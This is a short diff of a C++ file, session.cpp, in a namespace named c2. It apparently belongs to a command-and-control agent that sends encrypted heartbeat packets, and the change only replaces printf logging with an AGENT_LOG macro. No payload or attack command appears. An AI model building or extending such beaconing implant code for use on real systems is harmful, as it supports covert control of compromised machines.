@@ -1,5 +1,6 @@
 // session.cpp — 握手与心跳实现
 #include "session.h"
+#include "agent_debug.h"
 
 #include "agent_runtime.h"
 #include "crypto.h"
@@ -155,10 +156,10 @@ namespace c2
             h.timestamp = GetTickCount64();
             if (!net_write_packet(s->sock, h, sealed.data(), sealed.size()))
             {
-                printf("[%s] [heartbeat] SEND FAILED (conn broken)\n", log_ts().c_str());
+                AGENT_LOG("[%s] [heartbeat] SEND FAILED (conn broken)\n", log_ts().c_str());
                 break; // 连接断开
             }
-            printf("[%s] [heartbeat] send seq=%u (cmd=0x%04x, %zu bytes encrypted)\n",
+            AGENT_LOG("[%s] [heartbeat] send seq=%u (cmd=0x%04x, %zu bytes encrypted)\n",
                    log_ts().c_str(), h.seq, h.cmd, sealed.size());
         }
         return 0;
